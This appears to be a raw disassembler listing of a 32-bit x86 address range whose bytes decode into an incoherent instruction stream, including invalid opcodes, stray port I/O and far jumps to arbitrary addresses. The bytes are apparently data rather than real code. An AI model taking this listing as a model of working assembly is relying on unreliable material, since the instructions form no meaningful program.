  41e675:	xor    BYTE PTR [ebp+0x1c],0x97
  41e679:	dec    ebx
  41e67a:	jmp    0x3ecb313f
  41e67f:	lea    ebx,[ebx+0x59]
  41e682:	int3   
  41e683:	push   ds
  41e684:	dec    ebx
  41e685:	pop    edi
  41e686:	xchg   edi,eax
  41e687:	ret    0x51f8
  41e68a:	sbb    ch,dh
  41e68c:	clc    
  41e68d:	fisubr DWORD PTR [eax-0x3b80235f]
  41e693:	data16 loope 0x41e691
  41e696:	imul   esi,eax,0x158a538b
  41e69c:	int    0x54
  41e69e:	mov    bl,0xe8
  41e6a0:	(bad)  
  41e6a1:	mov    cx,0x482f
  41e6a5:	cmp    esi,DWORD PTR [ecx-0x5912d70d]
  41e6ab:	lods   eax,DWORD PTR ds:[esi]
  41e6ac:	pop    edi
  41e6ad:	inc    BYTE PTR [eax-0x2b95f465]
  41e6b3:	fwait
  41e6b4:	aas    
  41e6b5:	dec    ebp
  41e6b6:	jge    0x41e684
  41e6b8:	xchg   ebp,eax
  41e6b9:	dec    eax
  41e6ba:	hlt    
  41e6bb:	sbb    ah,BYTE PTR [ebx+0x6caf7b1a]
	...
  41e731:	add    BYTE PTR [eax],al
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx+0x1582aece]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [eax],al
  41e74d:	loopne 0x41e74b
  41e74f:	jp     0x41e6ee
  41e751:	mul    BYTE PTR [ebx]
  41e753:	aas    
  41e754:	stos   DWORD PTR es:[edi],eax
  41e755:	push   ebx
  41e756:	inc    BYTE PTR gs:[ecx-0xff4faa]
  41e75d:	int    0x2f
  41e75f:	sub    bl,BYTE PTR [ebp-0xd7b739d]
  41e765:	outs   dx,BYTE PTR ds:[esi]
  41e766:	cli    
  41e767:	lahf   
  41e768:	cmp    ch,dl
  41e76a:	xchg   ecx,ecx
  41e76c:	pop    esp
  41e76d:	xchg   edi,eax
  41e76e:	test   BYTE PTR [esp+edx*1-0x2c],bh
  41e772:	inc    bl
  41e774:	sub    edi,eax
  41e776:	(bad)  [ebx-0x76e20e22]
  41e77c:	outs   dx,BYTE PTR es:[esi]
  41e77e:	mov    esp,0x98608555
  41e783:	or     eax,ebp
  41e785:	add    ah,BYTE PTR [ecx-0x629c257e]
  41e78b:	fwait
  41e78c:	loope  0x41e77b
  41e78e:	push   cs
  41e78f:	push   ss
  41e790:	mov    DWORD PTR [esi-0x65],ebp
  41e793:	std    
  41e794:	aas    
  41e795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e796:	leave  
  41e797:	mov    eax,0xa81cbddf
  41e79c:	adc    dl,cl
  41e79e:	fwait
  41e79f:	inc    esi
  41e7a0:	jg     0x41e7b4
  41e7a2:	aas    
  41e7a3:	or     al,BYTE PTR [ecx+edx*1+0x3b]
  41e7a7:	jbe    0x41e753
  41e7a9:	fstp   TBYTE PTR [esi+0x53]
  41e7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ad:	(bad)  
  41e7ae:	fnstcw WORD PTR [esi+0x34cf4e6f]
  41e7b4:	ds ret 0x70d7
  41e7b8:	lock icebp 
  41e7ba:	or     bh,BYTE PTR [edx]
  41e7bc:	add    DWORD PTR [esi+ebp*8+0x39af7bac],ebx
  41e7c3:	sbb    al,0x12
  41e7c5:	xchg   esi,eax
  41e7c6:	in     al,0x9b
  41e7c8:	push   ebp
  41e7c9:	nop
  41e7ca:	jg     0x41e81c
  41e7cc:	in     al,0xdc
  41e7ce:	arpl   WORD PTR ss:[esi],ax
  41e7d1:	adc    BYTE PTR [ebp+0x3],0x5a
  41e7d5:	jg     0x41e841
  41e7d7:	inc    ebp
  41e7d8:	or     BYTE PTR [edi-0x74],ch
  41e7db:	clc    
  41e7dc:	lock push eax
  41e7de:	test   BYTE PTR [ecx],ch
  41e7e0:	sbb    ch,BYTE PTR ds:0xa1efc69
  41e7e6:	sbb    al,0x70
  41e7e9:	push   ebp
  41e7ea:	int3   
  41e7eb:	xor    ecx,DWORD PTR [ecx+0xb415472]
  41e7f1:	and    bh,ch
  41e7f3:	and    esi,DWORD PTR [ecx-0x57]
  41e7f6:	cmc    
  41e7f7:	sub    ecx,DWORD PTR [ecx+0x1e90e0c4]
  41e7fd:	or     DWORD PTR [edi-0x5fd67b6a],edi
  41e803:	sub    edi,0xc
  41e806:	adc    al,BYTE PTR [edi]
  41e808:	push   edx
  41e809:	jbe    0x41e86f
  41e80b:	inc    edi
  41e80c:	std    
  41e80d:	sbb    DWORD PTR [edi+0x55],ecx
  41e810:	add    eax,0x6bdbbb6
  41e815:	mov    cl,0xfa
  41e817:	leave  
  41e818:	or     esi,DWORD PTR [edx]
  41e81a:	popa   
  41e81b:	adc    DWORD PTR [edi],esp
  41e81d:	xchg   esp,eax
  41e81e:	sti    
  41e81f:	push   es
  41e820:	xor    dh,BYTE PTR [ebx+0x13]
  41e823:	sub    ah,dl
  41e825:	imul   edi,DWORD PTR [ecx-0x225265c2],0x927f0dec
  41e82f:	cdq    
  41e830:	mov    edx,0xc25631b5
  41e835:	xchg   esp,eax
  41e836:	and    esp,ecx
  41e838:	dec    ebp
  41e839:	fdiv   DWORD PTR [edi]
  41e83b:	shl    ch,1
  41e83d:	in     eax,dx
  41e83e:	dec    ecx
  41e83f:	push   esi
  41e840:	mov    DWORD PTR [eax],0x0
	...
  41e8b2:	add    BYTE PTR [eax],al
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	xor    eax,0x1f7ca13f
  41e8c5:	dec    eax
  41e8c6:	add    DWORD PTR [eax],eax
  41e8c8:	cmc    
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [edx+0x3ec18ee7],bl
  41e8d1:	mov    edx,DWORD PTR [eax]
  41e8d3:	pop    ecx
  41e8d4:	(bad)  
  41e8d6:	dec    eax
  41e8d7:	xlat   BYTE PTR ds:[ebx]
  41e8d8:	lds    eax,FWORD PTR [ebp-0x358603b1]
  41e8de:	(bad)  
  41e8df:	sti    
  41e8e0:	mov    ds:0xe3507146,al
  41e8e5:	ins    DWORD PTR es:[edi],dx
  41e8e6:	pop    ebx
  41e8e7:	push   edx
  41e8e8:	xchg   ch,dh
  41e8ea:	xchg   BYTE PTR [ecx],bh
  41e8ec:	bound  edx,QWORD PTR [edx+0x653e6943]
  41e8f2:	mov    ebx,0xf5a5dc9c
  41e8f7:	sub    ebp,DWORD PTR [esi-0x22]
  41e8fa:	push   ebp
  41e8fb:	retf   
  41e8fc:	or     BYTE PTR [eax],dh
  41e8fe:	ins    DWORD PTR es:[edi],dx
  41e8ff:	fidivr DWORD PTR [edx-0x360831cc]
  41e905:	sub    al,0xd3
  41e907:	out    0xff,al
  41e909:	mov    eax,ds:0x1c4a6fa7
  41e90e:	std    
  41e90f:	(bad)  
  41e910:	push   edi
  41e911:	mov    al,ds:0x85982c8f
  41e916:	mov    ds:0xac886071,al
  41e91b:	sub    BYTE PTR [esp+ebx*2+0x5f],0x1e
  41e920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e921:	aam    0x3e
  41e923:	sar    bh,0x2b
  41e926:	gs mov bl,0x79
  41e929:	mov    WORD PTR ds:0xdc13cd6,ss
  41e92f:	into   
  41e930:	(bad)  
  41e931:	out    dx,eax
  41e932:	leave  
  41e933:	jnp    0x41e923
  41e935:	fs out dx,al
  41e937:	cmp    ecx,edi
  41e939:	pop    eax
  41e93a:	xor    eax,DWORD PTR [edx-0x7b2ee9a4]
  41e940:	push   cs
  41e941:	sbb    edx,edi
  41e943:	daa    
  41e944:	jmp    0x41e8c6
  41e946:	iret   
  41e947:	xchg   BYTE PTR ds:0x1f96c02a,bh
  41e94d:	inc    esp
  41e94e:	enter  0xf9f8,0x76
  41e952:	mov    ecx,0x6b555ad2
  41e957:	rcr    DWORD PTR [ecx-0x129ad90c],0xb6
  41e95e:	addr16 ret 
  41e960:	jecxz  0x41e929
  41e962:	inc    edi
  41e963:	mov    al,bl
  41e965:	cmp    esp,DWORD PTR [edi-0x4a38078b]
  41e96b:	loop   0x41e974
  41e96d:	jne    0x41e984
  41e96f:	jle    0x41e94b
  41e971:	(bad)  
  41e972:	rcr    DWORD PTR [edi],1
  41e974:	mul    DWORD PTR [edi-0x60]
  41e977:	scas   al,BYTE PTR es:[edi]
  41e978:	push   ebx
  41e979:	sbb    al,0xe7
  41e97b:	mov    eax,ds:0xfc0909c0
  41e980:	call   0xc01f:0x26370184
  41e987:	fsubr  QWORD PTR [edi+0x18]
  41e98a:	test   al,0xd5
  41e98c:	dec    esi
  41e98d:	xchg   esp,eax
  41e98e:	in     al,dx
  41e98f:	jb     0x41e94a
  41e991:	in     al,0xac
  41e993:	cmp    cl,bh
  41e995:	or     al,BYTE PTR [ecx-0x7d]
  41e998:	es mov ebx,0xb411d0a6
  41e99e:	and    ebx,DWORD PTR [edx]
  41e9a0:	mov    ecx,0xccbb0301
  41e9a5:	lds    edi,FWORD PTR [ebx]
  41e9a7:	mov    ecx,DWORD PTR [edi+0x70]
  41e9aa:	push   0x38518f3d
  41e9af:	or     edx,DWORD PTR [ebp-0xfe5891b]
  41e9b5:	cmp    DWORD PTR [edi-0x7e],edi
  41e9b8:	pop    esp
  41e9b9:	cdq    
  41e9ba:	jnp    0x41e9a9
  41e9bc:	aas    
  41e9bd:	enter  0x162c,0x86
	...
  41ea31:	add    BYTE PTR [eax],al
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fst    QWORD PTR [esi-0x58]
  41ea42:	loope  0x41e9f5
  41ea44:	adc    al,0x49
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [edx+0x61],al
  41ea4e:	pop    esi
  41ea4f:	sbb    BYTE PTR [eax+0x48141b4],dl
  41ea55:	adc    eax,0x352fe6a6
  41ea5a:	in     eax,0x86
  41ea5c:	push   ebp
  41ea5d:	lods   eax,DWORD PTR ds:[esi]
  41ea5e:	sub    BYTE PTR [edi],bl
  41ea60:	or     dl,0x58
  41ea63:	inc    esp
  41ea64:	test   al,0xbd
  41ea66:	in     al,dx
  41ea67:	pop    ecx
  41ea68:	out    dx,eax
  41ea69:	data16 out 0x6c,al
  41ea6c:	cmp    ecx,esi
  41ea6e:	repnz inc esp
  41ea70:	mov    dl,0x97
  41ea72:	jnp    0x41ea40
  41ea74:	addr16 mov cl,0x9f
  41ea77:	test   eax,0xa37233f3
  41ea7c:	cmc    
  41ea7d:	or     DWORD PTR [eax+0x40],ecx
  41ea80:	mov    al,ds:0xef5017eb
  41ea85:	cdq    
  41ea86:	cmp    eax,DWORD PTR [edx+0x7c8a460a]
  41ea8c:	push   edi
  41ea8d:	mov    esp,0x590f5053
  41ea92:	ja     0x41eac3
  41ea94:	out    0x1d,al
  41ea96:	push   eax
  41ea97:	mov    ecx,0xca63fef5
  41ea9c:	out    0x58,al
  41ea9e:	mov    ebp,0x2c2a2087
  41eaa3:	out    0xde,al
  41eaa5:	out    0x3a,eax
  41eaa7:	cs loopne 0x41eace
  41eaaa:	dec    esp
  41eaab:	jmp    0xcd81:0x4e36be09
  41eab2:	and    DWORD PTR [ebp+ebp*4-0x4],ebp
  41eab6:	test   BYTE PTR [esi+0xa090f21],al
  41eabc:	stc    
  41eabd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eabe:	lahf   
  41eabf:	out    0xbe,eax
  41eac1:	and    eax,0x49fd19c1
  41eac6:	sbb    dh,0xc7
  41eac9:	std    
  41eaca:	leave  
  41eacb:	mov    eax,ds:0x7eb877f0
  41ead0:	pushf  
  41ead1:	lods   eax,DWORD PTR ds:[esi]
  41ead2:	xchg   esi,eax
  41ead3:	dec    eax
  41ead4:	int    0x5e
  41ead6:	mov    esp,0xe1c07eb6
  41eadb:	ja     0x41eabd
  41eadd:	sahf   
  41eade:	mov    ds:0xf1aa1cc3,al
  41eae3:	pop    ss
  41eae4:	jno    0x41ea87
  41eae6:	xchg   edx,eax
  41eae7:	sbb    eax,0xcbc3c7ce
  41eaec:	sbb    DWORD PTR [ebx+0x4a759b64],ecx
  41eaf2:	push   ds
  41eaf3:	mov    dl,0x6b
  41eaf5:	mov    bl,0xdf
  41eaf7:	test   DWORD PTR [eax-0x31],0xf60e7128
  41eafe:	cdq    
  41eaff:	fs ja  0x41eb67
  41eb02:	inc    eax
  41eb03:	int3   
  41eb04:	dec    ebx
  41eb05:	add    eax,0x589227
  41eb0a:	cmp    ebx,DWORD PTR [ecx]
  41eb0c:	pop    ecx
  41eb0d:	std    
  41eb0e:	cmp    eax,0xb1e85ef6
  41eb13:	ret    0x5ded
  41eb16:	inc    edx
  41eb17:	add    BYTE PTR [edx],0x1b
  41eb1a:	or     esp,DWORD PTR [ecx-0x7d]
  41eb1d:	pushf  
  41eb1e:	fmul   QWORD PTR [ebx]
  41eb20:	xor    al,0x5
  41eb22:	loop   0x41eae7
  41eb24:	fiadd  DWORD PTR [ebp-0x7d]
  41eb27:	or     eax,0xef8b38f5
  41eb2c:	lods   al,BYTE PTR ds:[esi]
  41eb2d:	xchg   edi,eax
  41eb2e:	ds mov ebx,0x4a1b446
  41eb34:	mov    al,ds:0xd9c82ead
  41eb39:	pop    edi
  41eb3a:	stos   DWORD PTR es:[edi],eax
  41eb3b:	fild   DWORD PTR [edx]
  41eb3d:	nop
  41eb3e:	jmp    0x0:0xb17d
	...
  41ebb1:	add    BYTE PTR [eax],al
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	mov    dh,0x93
  41ebc2:	jo     0x41eb60
  41ebc4:	or     DWORD PTR [edx+0x1],ecx
  41ebc7:	add    ch,dh
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [ebp+0x3ab0eda2],ah
  41ebd1:	xchg   BYTE PTR [esi],ch
  41ebd3:	ret    
  41ebd4:	inc    ecx
  41ebd5:	mov    cs,WORD PTR [ebp+0x64ec4c36]
  41ebdb:	dec    esp
  41ebdc:	lea    eax,[ecx-0x3]
  41ebdf:	loop   0x41ec55
  41ebe1:	sub    BYTE PTR [ecx],cl
  41ebe3:	cld    
  41ebe4:	dec    ecx
  41ebe5:	add    DWORD PTR [ecx+edi*8-0x1848d6a2],0x74
  41ebed:	in     eax,0x30
  41ebef:	jle    0x41ebe7
  41ebf1:	mov    BYTE PTR [esi],bl
  41ebf3:	iret   
  41ebf4:	nop
  41ebf5:	jmp    0x41ebb7
  41ebf7:	xlat   BYTE PTR ds:[ebx]
  41ebf8:	aas    
  41ebf9:	add    cl,BYTE PTR [edi-0x3d]
  41ebfc:	and    dl,BYTE PTR [edi+edx*8-0x7f]
  41ec00:	les    eax,FWORD PTR [ecx+ecx*2]
  41ec03:	or     BYTE PTR [ecx+0x5682a98e],al
  41ec09:	das    
  41ec0a:	jmp    0x6364:0x9a7aa198
  41ec11:	into   
  41ec12:	pop    ebx
  41ec13:	cmp    BYTE PTR [eax],dl
  41ec15:	jno    0x41ec22
  41ec17:	leave  
  41ec18:	clc    
  41ec19:	mov    edx,0x56f540d5
  41ec1e:	pusha  
  41ec1f:	mov    ebp,0x5e89feef
  41ec24:	cmp    DWORD PTR [esi],eax
  41ec26:	and    eax,0x477a700d
  41ec2b:	push   es
  41ec2c:	and    DWORD PTR [edx],edi
  41ec2e:	mov    al,ds:0x3fadcfad
  41ec33:	mov    ds:0x40b2402d,al
  41ec38:	in     al,dx
  41ec39:	mov    edx,0xc64e4d02
  41ec3e:	mov    edx,0xb7f2b765
  41ec43:	fbstp  TBYTE PTR [ebp+0x17d42817]
  41ec49:	adc    esp,0xb4a75488
  41ec4f:	xor    ah,ah
  41ec51:	mov    ah,0xad
  41ec53:	arpl   WORD PTR [eax+0x3049463f],bx
  41ec59:	xor    eax,0x2a81a34f
  41ec5e:	add    ebx,DWORD PTR ds:0x107141c5
  41ec64:	mov    eax,ds:0x53d0e738
  41ec69:	retf   0xa806
  41ec6c:	jbe    0x41ece2
  41ec6e:	xor    al,0xfc
  41ec70:	je     0x41ec7a
  41ec72:	(bad)  
  41ec74:	in     al,0xe5
  41ec76:	dec    eax
  41ec77:	pushf  
  41ec78:	fnstenv [edi+0x4e]
  41ec7b:	(bad)  
  41ec7c:	jle    0x41ec81
  41ec7e:	(bad)  
  41ec7f:	mov    edi,0xed7ece50
  41ec84:	xor    eax,0x2faa6c3f
  41ec89:	push   esp
  41ec8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec8b:	in     eax,dx
  41ec8c:	xchg   ebp,eax
  41ec8d:	loop   0x41ec92
  41ec8f:	add    ebp,DWORD PTR [edi]
  41ec91:	sbb    ah,BYTE PTR [esp+ebx*4-0x2e]
  41ec95:	cmp    edx,DWORD PTR [ecx]
  41ec97:	and    al,0xe6
  41ec99:	lea    ebp,[ecx+ebx*1+0x7f332e28]
  41eca0:	loop   0x41ec3c
  41eca2:	aad    0x6b
  41eca4:	mov    cl,0x7c
  41eca6:	dec    edi
  41eca7:	lock pop edx
  41eca9:	daa    
  41ecaa:	das    
  41ecab:	mov    es,WORD PTR [edi+0x3ab7526a]
  41ecb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecb2:	cld    
  41ecb3:	imul   edi,DWORD PTR [ebp+ebx*4+0x7e71c028],0x4d
  41ecbb:	mov    edx,0xca494e62
  41ecc0:	jo     0x41ecc2
	...
  41ed32:	add    BYTE PTR [eax],al
  41ed34:	and    bl,dh
  41ed36:	das    
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	into   
  41ed41:	jl     0x41ecf7
  41ed43:	clc    
  41ed44:	dec    BYTE PTR [edx+0x1]
  41ed47:	add    ch,dh
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    ah,al
  41ed4d:	lods   eax,DWORD PTR ds:[esi]
  41ed4e:	jo     0x41ecf5
  41ed50:	mov    DWORD PTR [edi+0x50],ecx
  41ed53:	dec    ebx
  41ed54:	int3   
  41ed55:	jo     0x41ed2c
  41ed57:	in     eax,0xcb
  41ed59:	call   FWORD PTR [edx]
  41ed5b:	imul   ebp,edi,0xffffff93
  41ed5e:	retf   
  41ed5f:	mov    esi,DWORD PTR ss:[ecx+0x204ec875]
  41ed66:	rol    BYTE PTR [eax],cl
  41ed68:	retf   
  41ed69:	add    al,dh
  41ed6b:	or     al,0x24
  41ed6d:	fst    QWORD PTR [ecx+0x7f19a6a5]
  41ed73:	adc    al,0x38
  41ed75:	mov    ds:0xd2de1cf,eax
  41ed7a:	cmp    eax,0xdfef5b09
  41ed80:	bound  ecx,QWORD PTR [eax]
  41ed82:	inc    edi
  41ed83:	mov    edi,DWORD PTR [edi+ebp*2-0x5f]
  41ed87:	cli    
  41ed88:	push   ecx
  41ed89:	add    ecx,DWORD PTR [edi+0x1988841e]
  41ed8f:	inc    ebx
  41ed90:	and    BYTE PTR [edx+0x191eb56],ah
  41ed96:	push   ecx
  41ed97:	arpl   WORD PTR [esi+0x4d725c5d],di
  41ed9d:	jl     0x41ee04
  41ed9f:	pop    esp
  41eda0:	sti    
  41eda1:	enter  0x117d,0x68
  41eda5:	cdq    
  41eda6:	loop   0x41edc5
  41eda8:	jb     0x41ee0a
  41edaa:	pushf  
  41edab:	inc    ebx
  41edac:	loop   0x41ed67
  41edae:	fldenv [eax-0x6d]
  41edb1:	cdq    
  41edb2:	push   edx
  41edb3:	push   0xb81eb37e
  41edb8:	fstp   QWORD PTR [edi-0x1c]
  41edbb:	push   ecx
  41edbc:	cld    
  41edbd:	xor    al,cl
  41edbf:	jbe    0x41ed82
  41edc1:	aaa    
  41edc2:	ins    DWORD PTR es:[edi],dx
  41edc3:	add    eax,0xddc3abf4
  41edc8:	lods   al,BYTE PTR ds:[esi]
  41edc9:	ja     0x41ed59
  41edcb:	into   
  41edcc:	mov    eax,ds:0x9c51e71c
  41edd1:	xchg   bh,bh
  41edd3:	in     eax,dx
  41edd4:	push   ds
  41edd5:	xchg   edx,eax
  41edd6:	pusha  
  41edd7:	lods   eax,DWORD PTR ds:[esi]
  41edd8:	mov    esp,0x19d53702
  41eddd:	daa    
  41edde:	push   edx
  41eddf:	aad    0xf8
  41ede1:	out    0x27,eax
  41ede3:	int    0x2f
  41ede5:	mov    eax,ds:0x42c837af
  41edea:	out    0xf7,eax
  41edec:	dec    ebp
  41eded:	dec    edx
  41edee:	loop   0x41ee1c
  41edf0:	test   DWORD PTR ss:[eax-0x7c],0x1ec41c79
  41edf8:	in     eax,0x2
  41edfa:	sbb    ebp,edi
  41edfc:	jae    0x41edf0
  41edfe:	and    ch,BYTE PTR fs:[eax-0x6887d9e5]
  41ee05:	stc    
  41ee06:	test   eax,0xfeb6b3ff
  41ee0b:	mov    edi,0xbb8cbe91
  41ee10:	fcmovnu st,st(7)
  41ee12:	jns    0x41ee8b
  41ee14:	jmp    0xaf3fb57c
  41ee19:	jge    0x41ee37
  41ee1b:	mov    WORD PTR [esi],es
  41ee1d:	mov    eax,ds:0x34b88041
  41ee22:	out    0x2b,eax
  41ee24:	lock adc eax,0xdd906424
  41ee2a:	push   ebp
  41ee2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee2c:	dec    esp
  41ee2d:	fidiv  WORD PTR [ebx]
  41ee2f:	sbb    ch,BYTE PTR [eax+ebx*4]
  41ee32:	lea    esi,[eax]
  41ee34:	es adc DWORD PTR gs:[ebx-0x2d],ebp
  41ee39:	fcmovnbe st,st(4)
  41ee3b:	cld    
  41ee3c:	rcl    BYTE PTR [eax-0x2a],cl
  41ee3f:	add    DWORD PTR [eax+0x0],edi
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	fdiv   st(5),st
  41eec2:	pop    edx
  41eec3:	cmp    ebx,esi
  41eec5:	dec    ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    BYTE PTR [edx+0x483d1cd],cl
  41eed1:	cmp    eax,0xa49e8811
  41eed6:	mov    DWORD PTR [edx],edx
  41eed8:	sub    DWORD PTR [ebp+0x49],ebp
  41eedb:	retf   
  41eedc:	mov    ebp,0x68bee9d2
  41eee1:	data16 jno 0x41ef20
  41eee4:	int3   
  41eee5:	xchg   ebp,eax
  41eee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee7:	cdq    
  41eee8:	sub    bl,BYTE PTR [edi-0x8]
  41eeeb:	pop    ecx
  41eeec:	mov    ah,0x14
  41eeee:	pop    ebx
  41eeef:	mov    edi,0xed4fccde
  41eef4:	call   0x680851f5
  41eef9:	or     BYTE PTR [ecx],0xc9
  41eefc:	pop    ebp
  41eefd:	test   al,0xd7
  41eeff:	loope  0x41eef9
  41ef01:	xchg   edi,eax
  41ef02:	dec    edi
  41ef03:	loopne 0x41eef5
  41ef05:	adc    eax,0xc762a976
  41ef0a:	mov    cl,0x87
  41ef0c:	xchg   edx,eax
  41ef0d:	jb     0x41eeec
  41ef0f:	cld    
  41ef10:	dec    esp
  41ef11:	aam    0x5
  41ef13:	sbb    eax,0x6cabc0e0
  41ef19:	jp     0x41ef49
  41ef1b:	lds    ebx,FWORD PTR [ecx]
  41ef1d:	push   edx
  41ef1e:	nop
  41ef1f:	popf   
  41ef20:	aas    
  41ef21:	push   es
  41ef22:	push   ds
  41ef23:	enter  0x264a,0xa8
  41ef27:	push   0x42
  41ef29:	sbb    eax,0x19eafb8e
  41ef2e:	xchg   ebp,eax
  41ef2f:	test   eax,0x23bbf060
  41ef34:	cmp    dl,BYTE PTR [ebx+0x42]
  41ef37:	jle    0x41ef38
  41ef39:	or     DWORD PTR [ecx-0xf],edi
  41ef3c:	sbb    DWORD PTR [esi],esi
  41ef3e:	add    DWORD PTR [eax-0x12d3e41],ebx
  41ef44:	mov    ebp,0xbb3d643b
  41ef49:	sub    al,0x3b
  41ef4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef4c:	in     eax,dx
  41ef4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4e:	pop    edi
  41ef4f:	pop    edx
  41ef50:	call   0x1459ad3f
  41ef55:	mov    ds:0x357a7bd9,eax
  41ef5a:	sti    
  41ef5b:	fcom   QWORD PTR [ebx-0x173ddcba]
  41ef61:	mov    dh,0x6a
  41ef63:	sbb    ebx,ebp
  41ef65:	mov    edx,0x351262e2
  41ef6a:	jnp    0x41efb5
  41ef6c:	mov    esi,0xb04dc5db
  41ef71:	retf   0x4534
  41ef74:	fisub  WORD PTR [ebp+0x16]
  41ef77:	dec    esi
  41ef78:	push   edi
  41ef79:	imul   ecx,DWORD PTR [esi+0x351e4d6],0x89441b8b
  41ef83:	enter  0x326b,0x60
  41ef87:	pusha  
  41ef88:	mov    DWORD PTR [ebx],ebp
  41ef8a:	adc    ecx,ebp
  41ef8c:	fimul  DWORD PTR [edx]
  41ef8e:	jg     0x41efc4
  41ef90:	lock lods al,BYTE PTR ds:[esi]
  41ef92:	xor    DWORD PTR [eax],edi
  41ef94:	mov    fs,WORD PTR [ebx-0x70404061]
  41ef9a:	stos   DWORD PTR es:[edi],eax
  41ef9b:	imul   ebx,ebx,0xffffffe4
  41ef9e:	pop    ebx
  41ef9f:	cwde   
  41efa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efa1:	dec    eax
  41efa2:	push   eax
  41efa3:	leave  
  41efa4:	fst    DWORD PTR [ecx+esi*8+0x390c3559]
  41efab:	and    al,0xcb
  41efad:	out    0x2f,al
  41efaf:	inc    eax
  41efb0:	and    DWORD PTR [edx+0x5f],edi
  41efb3:	out    0xd5,al
  41efb5:	mov    ds:0xd6774084,al
  41efba:	cwde   
  41efbb:	xchg   edx,eax
  41efbc:	gs push esp
  41efbe:	jg     0x41f02b
  41efc0:	xchg   ecx,eax
	...
  41f031:	add    BYTE PTR [eax],al
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x2f]
  41f041:	ins    DWORD PTR es:[edi],dx
  41f042:	xchg   ebx,eax
  41f043:	pushf  
  41f044:	call   0xf541f195
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [ebx-0x79a5ec9b],ch
  41f051:	cmp    cl,dh
  41f053:	shl    ebp,cl
  41f055:	mov    DWORD PTR [esi],ecx
  41f057:	dec    ecx
  41f058:	loope  0x41efef
  41f05a:	mov    esp,0xcc6dad15
  41f05f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f060:	cmp    cl,bl
  41f062:	jge    0x41f073
  41f064:	data16 stc 
  41f066:	xchg   ecx,edi
  41f068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f069:	xchg   ebp,eax
  41f06a:	push   edx
  41f06b:	ret    0xfe02
  41f06e:	sub    al,0x4
  41f070:	jmp    0x452ae599
  41f075:	int    0xd
  41f077:	sub    ecx,DWORD PTR [edx-0x49]
  41f07a:	adc    eax,0x2a1735e3
  41f07f:	lea    ebp,[esi+eax*1-0x48]
  41f083:	add    ebx,esp
  41f085:	pop    ds
  41f086:	jno    0x41f066
  41f088:	int    0x0
  41f08a:	fwait
  41f08b:	mov    dl,0xb5
  41f08d:	inc    esi
  41f08e:	pop    ss
  41f08f:	out    0x5,eax
  41f091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f092:	mov    bl,0x69
  41f094:	out    0x35,eax
  41f096:	push   ecx
  41f097:	jo     0x41f093
  41f099:	loop   0x41f111
  41f09b:	cmp    al,0xc0
  41f09d:	out    dx,eax
  41f09e:	xchg   esp,eax
  41f09f:	lahf   
  41f0a0:	sbb    eax,0x2566e3f2
  41f0a5:	pusha  
  41f0a6:	inc    edi
  41f0a7:	xlat   BYTE PTR ds:[ebx]
  41f0a8:	sub    esp,DWORD PTR [eax-0x1df60172]
  41f0ae:	cs xchg edx,eax
  41f0b0:	es scas eax,DWORD PTR es:[edi]
  41f0b2:	aad    0xcd
  41f0b4:	fs cmp bh,BYTE PTR gs:[edi]
  41f0b8:	add    al,0x14
  41f0ba:	out    dx,al
  41f0bb:	xchg   ebp,eax
  41f0bc:	and    BYTE PTR [edi-0x211b0be9],bh
  41f0c2:	je     0x41f0cb
  41f0c4:	pop    ds
